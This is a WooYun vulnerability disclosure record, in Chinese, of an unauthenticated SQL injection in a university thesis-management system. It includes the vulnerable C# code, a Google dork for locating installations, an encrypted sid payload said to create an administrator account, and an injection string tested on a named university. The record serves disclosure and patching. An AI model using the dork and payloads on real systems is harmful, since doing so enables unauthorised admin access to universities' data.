{"id": 43248, "wybug_id": "wooyun-2014-083321", "wybug_title": "某通用型毕业论文管理系统存在SQL注射（无需登录，无视waf，无视防火墙，影响众多高校系统）", "wybug_corp": "南京先极科技有限公司", "wybug_author": "six-door", "wybug_date": "2014-11-17 11:41", "wybug_open_date": "2015-02-15 11:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向公众公开  简要描述： 无需账号登陆（因为可以自己任意加），无视waf（因为数据加密），秒加管理员（因为管理员权限最大）。。。。 详细说明：  前期回顾： WooYun: 某通用型毕业论文管理系统存在SQL注射（无视waf，影响众多高校） 实际上sid参数经解密直接带入了查询，但是大部分页面都是有验证，于是我找呀找，终于找到了一处/LoginRole.aspx#1，首先看下LoginRole类，都包含了哪些函数\n.........//部分源代码省略    protected void Page_Load(object sender, EventArgs e);    // Properties    protected global_asax ApplicationInstance { get; }    protected DefaultProfile Profile { get; }}\n大概看了下，global_asax ApplicationInstance、DefaultProfile Profile均没有session验证，那么会不会在page_load里面呢#2、分析下Page_load\nprotected void Page_Load(object sender, EventArgs e){    if (!base.IsPostBack)    {        DataRow dataRow = this.userclass.GetDataRow(\"select  * from t_user where userid='\" + this.userclass.getUSERuserid(base.Request.QueryString[\"sid\"], \"userid\") + \"'\");        if (dataRow != null)        {            if (dataRow[\"iszj\"].ToString() == \"是\")            {                this.ImageButton4.Visible = true;            }            if (dataRow[\"yuanzhang\"].ToString() != \"\")            {                this.ImageButton1.Visible = true;            }            if (dataRow[\"mishu\"].ToString() != \"\")            {                this.ImageButton2.Visible = true;            }        }    }}\n可以看出，页面不需要任何验证就可以访问，sid经过解密直接带入了数据库查询，由于sid我们可以自由构造，所有尽情的注射吧。。。至于sid如何构造，请查看 WooYun: 某通用型毕业论文管理系统存在SQL注射（无视waf，影响众多高校） ps:这里的decrpt/encrpt函数的key值已经写死在程序里的如若需要key值，请联系南京南京先极科技有限公司    漏洞证明：  漏洞证明如下:#1,谷歌：intitle:毕业设计（论文）智能管理系统\n\n#2，访问http://x.x.x.x/loginrole.aspx?sid=E3AA19ABFE7ACF9D6B9E9475B003C7D3F2D8AA96C0D47B2FDA61C14FAF94A5A389937FA69CFC7DBF4CD76A87DAE7B0C2CB207D24260313BDD010BCB6BB60A131A7E64AC10A01E1291B8B282F36A70BFC448A2E800F096B54B4DD021B0922305FCFB91757E0AC6F4D4B9CECD499EA28C2C7DFAF96A62E2467该sid会添加一个wooyun1,six-door的管理员用户#3，直接登陆管理系统，你就是管理员了！！！！以上海交大为例：\nsql:18' and user>0--sid:22327B245BF2A6E7297E5114AC0E7F522FD73C1E4783D2F1\n\n\nps:由于其登陆密码进行了加密，且暂不得知加密方式，加了账号也登不上。。。。贴出3例以供CNCERT复测，及证明其通用性\n\n\n\n\n\n上述所添加账号已经删除。   修复方案：  删除该页面；校验解密后的sid   版权声明：转载请注明来源 six-door@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2014-11-21 14:10 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}